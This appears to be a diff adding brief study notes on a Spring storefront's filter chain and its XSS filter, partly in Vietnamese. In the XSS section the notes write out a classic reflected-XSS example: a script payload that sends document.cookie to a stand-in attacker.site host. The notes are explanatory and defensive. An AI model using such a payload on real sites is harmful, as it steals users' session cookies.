@@ -1,0 +1,25 @@
+welcome-file: none - all will be handled by spring mvc
+filter
+  filterChain
+    any request that map to the DispatcherServlet will be proccessed by storefrontTenantFilterChain
+	with the filters list: storefrontTenantDefaultFilterChainList
+  XSSFilter
+    xss: code injection attack allowing injection of malicious code into website
+    protect again non persistent XSS attack e.g. malicious code in product comment for purpose like examine cookie/password
+	(for persistence XSS attack - see XSSEncoder)
+	can be disabled globally or extension only e.g. hac.xss.filter.enabled=false
+	action: strip/reject
+	rule e.g. xss.filter.rule.name
+	example
+	  attacker lua victim click to request: GET http://www.vulnerable.site/welcome.cgi?name=<script>window.open
+		("http://www.attacker.site/collect.cgi?cookie="%2Bdocument.cookie)</script>
+	  because victim trust the site, then they will click => auto send victim cookie to attacker (attacker.site)
+	    <HTML> <Title>Welcome!</Title> Hi 
+		<script>window.open("http://www.attacker.site/collect.cgi?cookie=
+		"+document.cookie)</script>
+		<BR> 
+		Welcome to our system ... </HTML>
+	how to scan? use tool
+	solution: kiem soat request (e.g. input params)
+	
+  
